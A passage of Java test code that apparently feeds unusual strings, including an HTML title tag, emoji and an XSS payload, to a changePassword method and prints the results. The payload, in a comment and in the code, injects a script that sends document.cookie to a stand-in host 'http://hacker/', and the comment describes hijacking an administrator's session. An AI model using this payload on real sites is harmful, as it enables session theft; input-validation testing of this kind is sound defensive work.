        System.out.println("<title>Example document: XSS Doc</title>" + " : " + p.changePassword("hKKaab9868666!@#", "<title>Example document: XSS Doc</title>"));
        System.out.println("<title>Example document: XSS Doc</title>");
        System.out.println();

        /*"><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>
        sitting on the other end, at the web server, you will be receiving hits where after a double space is the user's cookie. If an administrator clicks the link, an attacker could steal the session ID and hijack the session.*/

        System.out.println("\"><SCRIPT>var+img=new+Image();img.src=\"http://hacker/\"%20+%20document.cookie;</SCRIPT>" + " : " + p.changePassword("hKKaab9868666!@#", "\"><SCRIPT>var+img=new+Image();img.src=\"http://hacker/\"%20+%20document.cookie;</SCRIPT>"));
        System.out.println("\"><SCRIPT>var+img=new+Image();img.src=\"http://hacker/\"%20+%20document.cookie;</SCRIPT>");
        System.out.println();

        //ℹ️⌛️⚠️✒️❤️🀄️🈚️
        System.out.println("ℹ️⌛️⚠️✒️❤️\uD83C\uDC04️\uD83C\uDE1A️#" + " : " + p.changePassword("hKKaab9868666!@#", "ℹ️⌛️⚠️✒️❤️\uD83C\uDC04️\uD83C\uDE1A️#"));
        System.out.println("ℹ️⌛️⚠️✒️❤️\uD83C\uDC04️\uD83C\uDE1A️#");
        System.out.println();


    }
}
